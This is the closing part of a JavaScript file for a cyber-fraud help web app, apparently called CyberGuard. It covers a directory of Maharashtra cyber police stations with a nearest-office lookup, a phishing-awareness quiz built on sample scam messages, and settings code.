"verification": "official", "source": "Yavatmal Police official website"}, {"id": "chandrapur", "region": "other", "commissionerate": "Chandrapur District Police", "district": "Chandrapur", "name": "Cyber Police Station, Chandrapur", "jurisdiction": "Chandrapur district", "phones": ["9767211611"], "email": "cybercell.chandrapur@mahapolice.gov.in", "address": "Office of the Superintendent of Police, near Collector Office, Chandrapur 442401", "website": null, "lat": 19.95, "lon": 79.3, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Third-party directory listing (not an official page)"}, {"id": "bhandara", "region": "other", "commissionerate": "Bhandara District Police", "district": "Bhandara", "name": "Cyber Police Station, Bhandara", "jurisdiction": "Bhandara district", "phones": ["9422730412"], "email": "cyber.bhandara@mahapolice.gov.in", "address": "Beside LCB, Police Headquarters, behind Collector Office, Bhandara 441904", "website": null, "lat": 21.17, "lon": 79.65, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Third-party directory listing (not an official page)"}, {"id": "buldhana", "region": "other", "commissionerate": "Buldhana District Police", "district": "Buldhana", "name": "Cyber Cell, Buldhana (Gramin Police Station)", "jurisdiction": "Buldhana district", "phones": ["9226577934"], "email": "cyber.buldhana@mahapolice.gov.in", "address": "Gramin Police Station Buldhana, Mumbai–Kolkata Highway, Milind Nagar, Buldhana 443001", "website": null, "lat": 20.53, "lon": 76.18, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Third-party directory listing (not an official page)"}]};
let DIR=LS.get('dir',null)||DIR_BUILTIN,dirSel='all';
const VER={official:['OFFICIAL SITE',''],'cross-checked':['CROSS-CHECKED · 3RD-PARTY','a'],'brief-only':['UNVERIFIED · FROM PROJECT BRIEF','r']};
const telHref=n=>{const d=String(n).replace(/\D/g,'');return 'tel:'+((d.length===10&&/^[6-9]/.test(d))?'+91'+d:d.startsWith('0')?'+91'+d.slice(1):d)};
const mapHref=a=>'https://www.google.com/maps/search/?api=1&query='+encodeURIComponent(a);
const dirsHref=a=>'https://www.google.com/maps/dir/?api=1&destination='+encodeURIComponent(a);
function contactCard(e,extra=''){
  const v=VER[e.verification]||VER['brief-only'];
  const ph=(e.phones||[]).map(p=>`<div class="line"><b>PHONE</b>${esc(p)} <a class="btn sm" href="${telHref(p)}">CALL</a> <button class="btn sm" data-copy="${esc(p)}">COPY NUMBER</button></div>`).join('');
  return `<div class="card contact ${extra}"><h3>${esc(e.name)}</h3><div>${tag(v[0],v[1])}${e.statewide?tag('STATEWIDE','c'):''}</div>
  <div class="line"><b>JURISDICTION</b>${esc(e.jurisdiction||e.district||'')}</div>${ph}
  ${e.email?`<div class="line"><b>EMAIL</b>${esc(e.email)} <a class="btn sm" href="mailto:${esc(e.email)}">EMAIL</a> <button class="btn sm" data-copy="${esc(e.email)}">COPY EMAIL</button></div>`:'<div class="line"><b>EMAIL</b><span style="color:var(--muted)">not verified</span></div>'}
  ${e.address?`<div class="line"><b>ADDRESS</b>${esc(e.address)}</div>`:''}
  <div class="line"><b>VERIFIED</b>${esc(e.lastVerified||'—')} · <b style="margin-left:6px">SOURCE</b>${esc(e.source||'—')}</div>
  ${e.note?`<div class="note" style="margin-top:6px">${esc(e.note)}</div>`:''}
  <div class="acts">${e.phones?.[0]?`<a class="btn sm red" href="${telHref(e.phones[0])}">CALL</a>`:''}${e.email?`<a class="btn sm" href="mailto:${esc(e.email)}">EMAIL</a>`:''}${e.website?`<a class="btn sm" href="${esc(e.website)}" target="_blank" rel="noopener">WEBSITE ↗</a>`:''}${e.address?`<a class="btn sm" href="${mapHref(e.address)}" target="_blank" rel="noopener">OPEN MAP ↗</a><a class="btn sm" href="${dirsHref(e.address)}" target="_blank" rel="noopener">DIRECTIONS ↗</a>`:''}</div></div>`;
}
function renderDirectory(){
  if(!DIR)return;
  const sel=$('#citySel');if(!sel.options.length)sel.innerHTML='<option value="">Select your city / district manually…</option>'+DIR.regions.filter(r=>r.key!=='all').map(r=>`<option value="${esc(r.key)}">${esc(r.label)}</option>`).join('');
  $('#dirFilters').innerHTML=DIR.regions.map(r=>`<button class="chip${r.key===dirSel?' on':''}" data-dir="${esc(r.key)}">${esc(r.label)}</button>`).join('');
  let list=DIR.entries.filter(e=>dirSel==='all'||e.region===dirSel||(dirSel==='other'&&e.statewide));
  const state_=DIR.entries.filter(e=>e.statewide);
  const html=list.map(e=>contactCard(e)).join('');
  const none=!list.length?`<div class="card"><h3>No verified listing for this area yet</h3><p class="sub" style="margin:0 0 10px">This directory doesn’t have a confirmed cyber police contact here. Do not guess a number. Use these routes:</p>${li(['Call <b>1930</b> for cyber fraud.','Report online at <b>cybercrime.gov.in</b>.','Contact your nearest police station or the commissionerate / district police website; dial <b>112</b> in an emergency.','Add a confirmed entry to the directory file (see Settings).'])}<div class="row-actions"><a class="btn red" href="tel:1930">CALL 1930</a><a class="btn" href="https://www.cybercrime.gov.in/" target="_blank" rel="noopener">NCRP ↗</a></div></div>${state_.map(e=>contactCard(e)).join('')}`:'';
  $('#contacts').innerHTML=html+none;
  $('#dirMeta').textContent=`Directory version ${DIR.meta?.version||'?'} · ${DIR.entries.length} entries · each card shows how it was verified. Numbers and emails change — confirm on the official site before relying on them.`;
}
document.addEventListener('click',e=>{
  const d=e.target.closest('[data-dir]');if(d){dirSel=d.dataset.dir;renderDirectory();return}
  const c=e.target.closest('[data-copy]');if(c)copyText(c.dataset.copy,'Copied: '+c.dataset.copy);
});
$('#citySel').addEventListener('change',e=>{if(!e.target.value)return;dirSel=e.target.value;renderDirectory();$('#nearOut').innerHTML=`<div class="note">Showing contacts for <b>${esc(DIR.regions.find(r=>r.key===dirSel)?.label||'')}</b>. Your location was not used.</div>`;$('#contacts').scrollIntoView({behavior:reduced?'auto':'smooth'})});
function hav(a,b,c,d){const R=6371,r=x=>x*Math.PI/180,dl=r(c-a),dn=r(d-b),x=Math.sin(dl/2)**2+Math.cos(r(a))*Math.cos(r(c))*Math.sin(dn/2)**2;return 2*R*Math.asin(Math.sqrt(x))}
ACT.near=()=>{
  const out=$('#nearOut');
  if(!navigator.geolocation){out.innerHTML='<div class="warn">Location isn’t available in this browser. Select your city / district above — everything else works normally.</div>';return}
  out.innerHTML='<div class="note">Waiting for your browser’s permission prompt… You can decline and pick a city instead.</div>';
  navigator.geolocation.getCurrentPosition(pos=>{
    let la=pos.coords.latitude,lo=pos.coords.longitude;
    const cen=DIR.regions.filter(r=>r.lat!=null).map(r=>({r,km:hav(la,lo,r.lat,r.lon)})).sort((x,y)=>x.km-y.km)[0];
    const near=DIR.entries.filter(e=>e.lat!=null&&!e.statewide).map(e=>({e,km:hav(la,lo,e.lat,e.lon)})).sort((x,y)=>x.km-y.km).slice(0,3);
    la=lo=null;                                                    // coordinates are discarded immediately — never stored or sent
    if(cen&&cen.km<90){dirSel=cen.r.key;renderDirectory()}
    if(!near.length||near[0].km>150){out.innerHTML=`<div class="warn">No listed cyber police office within about 150 km of you in this directory. Call <b>1930</b> or report at cybercrime.gov.in, and use the city selector or the nearest police station.</div>`;return}
    out.innerHTML=`<div class="note">Nearest listed offices (straight-line distance, approximate). Your location was used on this device only and has not been stored or sent anywhere.</div><div class="contacts mt">${near.map(n=>contactCard(n.e,'nearby').replace('<h3>',`<h3>~${Math.round(n.km)} km · `)).join('')}</div>`;
  },err=>{out.innerHTML='<div class="warn">Location permission was not granted. No problem — select your city / district from the list above. Everything keeps working.</div>'},{enableHighAccuracy:false,timeout:10000,maximumAge:60000});
};
async function loadDirFile(){
  if(!/^https?:$/.test(location.protocol))return;
  try{const r=await fetchTO('directory.json',{cache:'no-store'},3500);if(!r.ok)return;const j=await r.json();if(validDir(j)&&!LS.get('dir',null)){DIR=j;renderDirectory();$('#dirStatus').textContent='Loaded directory.json (v'+(j.meta?.version||'?')+') from the site.'}}catch{}
}
const validDir=j=>j&&Array.isArray(j.entries)&&Array.isArray(j.regions)&&j.entries.every(e=>e&&e.name&&Array.isArray(e.phones||[]));
$('#dirFile').addEventListener('change',e=>{const f=e.target.files[0];if(!f)return;const r=new FileReader();r.onload=()=>{try{const j=JSON.parse(r.result);if(!validDir(j))throw new Error('bad shape');DIR=j;LS.set('dir',j);renderDirectory();$('#dirStatus').textContent='Imported '+j.entries.length+' entries (v'+(j.meta?.version||'?')+'). Stored in this browser only.'}catch{$('#dirStatus').textContent='That file is not a valid directory.json (needs “regions” and “entries”).'}};r.readAsText(f)});
ACT['dir-reset']=()=>{LS.del('dir');DIR=DIR_BUILTIN;renderDirectory();$('#dirStatus').textContent='Reset to the built-in directory.'};
PAGE_HOOKS.help=renderDirectory;

/* ---------- Phish Lab quiz ---------- */
const QUIZ=[
 {q:'SMS: “SBI: your account is blocked. Update KYC now at http://sbi-kyc-update.in.net”. What do you do?',o:['Tap the link and update quickly','Reply STOP','Ignore the link and check in the official bank app or website you type yourself','Forward it to friends as a warning with the link'],a:2,w:'Banks don’t send KYC links that threaten blocking. The domain is not the bank’s. Use the official app.'},
 {q:'An email says “microsoft.com” in the link text, but hovering shows microsoft-support.top. What gives it away?',o:['The link text','The actual destination domain','The email font','The sender’s name'],a:1,w:'The real destination is what counts. Link text can say anything.'},
 {q:'A caller says they’re from your bank and asks for the OTP “to cancel a fraud transaction”. Best response?',o:['Share it — they’re the bank','Hang up and call the number on your card or in the bank’s app','Share only half','Ask for their employee ID and then share it'],a:1,w:'No genuine bank asks for an OTP. The OTP authorises a transaction — it never cancels one.'},
 {q:'To RECEIVE money by QR code or collect request, do you need to enter your UPI PIN?',o:['Yes, always','Only for large amounts','No — the PIN is only for sending money','Yes, to verify'],a:2,w:'If you are asked for your UPI PIN, money is leaving your account.'},
 {q:'The site shows a padlock (HTTPS). Does that mean it’s safe?',o:['Yes, fully safe','No — it only means the connection is encrypted, not that the site is honest','Yes if the padlock is green','Yes if it loads fast'],a:1,w:'Phishing sites commonly use HTTPS. Check the exact domain instead.'},
 {q:'A Telegram message offers ₹5000/day for liking videos, but you must pay a small “deposit” first. Likely?',o:['A genuine job','A task / advance-fee scam','A bank offer','A government scheme'],a:1,w:'Paying to earn money — and early small payouts to build trust — is a classic task scam.'},
 {q:'SMS: “Your parcel is held — pay ₹25 redelivery fee at this link”. Best move?',o:['Pay — it’s only ₹25','Ignore the link and check with the courier through its official site or app','Reply with your address','Call the number in the SMS'],a:1,w:'The small fee is bait to capture your card or UPI details.'},
 {q:'A video call from “CBI” says you are under “digital arrest” and must stay on the call and transfer money. What is this?',o:['A legal procedure','A scam — no agency does this','A bank security check','A court summons'],a:1,w:'There is no “digital arrest”. Disconnect, tell someone you trust and call 1930.'}
];
let qz={i:0,score:0,locked:false};
function renderQuiz(){
  const b=$('#quizBox');
  if(qz.i>=QUIZ.length){b.innerHTML=`<h3 style="margin:0 0 8px;color:var(--white)">Score: ${qz.score} / ${QUIZ.length}</h3><p class="sub">${qz.score>=7?'Sharp eyes. Keep verifying through official channels.':qz.score>=4?'Good start — review the explanations and try again.':'These scams are designed to fool people. Replay and read each explanation.'}</p><button class="btn primary mt" data-act="quiz-reset">PLAY AGAIN</button>`;return}
  const x=QUIZ[qz.i];
  b.innerHTML=`<div class="ct">Scenario ${qz.i+1} of ${QUIZ.length} · score ${qz.score}</div><p style="font-size:15px;color:var(--white)">${esc(x.q)}</p>${x.o.map((t,i)=>`<button class="quiz-opt" data-qz="${i}">${esc(t)}</button>`).join('')}<div id="qzFb"></div>`;qz.locked=false;
}
document.addEventListener('click',e=>{
  const o=e.target.closest('[data-qz]');if(!o||qz.locked)return;qz.locked=true;
  const x=QUIZ[qz.i],i=+o.dataset.qz;$$('.quiz-opt').forEach((b,j)=>{if(j===x.a)b.classList.add('ok');else if(j===i)b.classList.add('bad')});
  if(i===x.a)qz.score++;
  $('#qzFb').innerHTML=`<div class="note mt"><b>${i===x.a?'Correct.':'Not quite.'}</b> ${esc(x.w)}</div><button class="btn primary mt" data-act="quiz-next">${qz.i===QUIZ.length-1?'SEE SCORE':'NEXT'}</button>`;
});
ACT['quiz-next']=()=>{qz.i++;renderQuiz()};ACT['quiz-reset']=()=>{qz={i:0,score:0,locked:false};renderQuiz()};
PAGE_HOOKS.training=()=>{if(!$('#quizBox').children.length)renderQuiz()};

/* ---------- Settings ---------- */
const SRC_LABELS=[['doh','DNS-over-HTTPS (dns.google / Cloudflare)'],['ipintel','IP / ASN lookup (ipwho.is / ipapi.co)'],['rdap','RDAP registration data (rdap.org)'],['urlscan','urlscan.io historical search'],['backend','Use backend API if detected (/api/*)']];
function renderSettings(){
  $('#srcToggles').innerHTML=SRC_LABELS.map(([k,l])=>`<label class="chk"><input type="checkbox" data-cfg="${k}" ${cfg[k]?'checked':''}>${esc(l)}</label>`).join('');
  $('#apiBase').value=cfg.apiBase||'';$('#gsbKey').value=cfg.gsbKey||'';
}
ACT['save-cfg']=async()=>{
  $$('input[data-cfg]').forEach(c=>cfg[c.dataset.cfg]=c.checked);cfg.apiBase=$('#apiBase').value.trim();cfg.gsbKey=$('#gsbKey').value.trim();
  LS.set('cfg',cfg);await detectBackend();toast('Settings saved. Mode: '+(backend.present?'full stack':'standalone'));
};
ACT.ping=async()=>{$('#cfgStatus').textContent='Testing…';cfg.apiBase=$('#apiBase').value.trim();const ok=await detectBackend();$('#cfgStatus').textContent=ok?'Backend reachable at '+(cfg.apiBase||'this origin')+'.':'No backend found. Standalone mode uses browser-side lookups only.'};
ACT['clear-data']=()=>{if(!confirm('Erase all CyberGuard data stored in this browser (history, settings, checklist progress)?'))return;try{Object.keys(localStorage).filter(k=>k.startsWith('cg.')).forEach(k=>localStorage.removeItem(k))}catch{}cfg=Object.assign({},CFG_DEF);renderHistory();renderSettings();toast('Local data erased.')};
PAGE_HOOKS.settings=renderSettings;

/* ---------- init ---------- */
(function init(){
  setFx(fxOn);startMatrix();startGlobe();boot();renderHistory();detectBackend();
  const pipe=$$('.pipe span');if(pipe.length&&!reduced){let k=0;setInterval(()=>{pipe.forEach((s,i)=>{s.style.color=i===k?'#001a0a':'';s.style.background=i===k?'var(--g)':''});k=(k+1)%pipe.length},900)}
  loadDirFile();
  const h=(location.hash||'').replace('#','');if(h&&LABELS[h])navigate(h);
})();


